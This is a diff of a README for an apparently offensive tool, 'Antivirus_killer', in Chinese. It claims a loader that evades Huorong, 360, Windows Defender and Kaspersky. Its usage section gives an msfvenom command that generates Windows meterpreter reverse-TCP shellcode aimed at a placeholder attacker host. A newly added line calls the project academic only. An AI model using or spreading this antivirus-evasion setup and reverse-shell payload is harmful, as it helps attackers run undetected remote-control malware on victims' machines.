@@ -1,6 +1,7 @@
 # Antivirus_killer
-免杀主流防病毒软件
-测试与2024年9月19日加载器2024_9_19(需配合新版加密器)可过最新版火绒、360核晶模式、windows自带杀软、卡巴斯基
+免杀主流防病毒软件<br />
+测试于2024年9月19日加载器2024_9_19(需配合新版加密器)可过最新版火绒、360核晶模式、windows自带杀软、卡巴斯基<br />
+该项目仅供学术交流参考，请大家合法学习和使用项目
 # 使用方法
 ## 生成shellcode
 msfvenom LHOST=x.x.x.x LPORT=443 -p windows/x64/meterpreter/reverse_tcp -f c
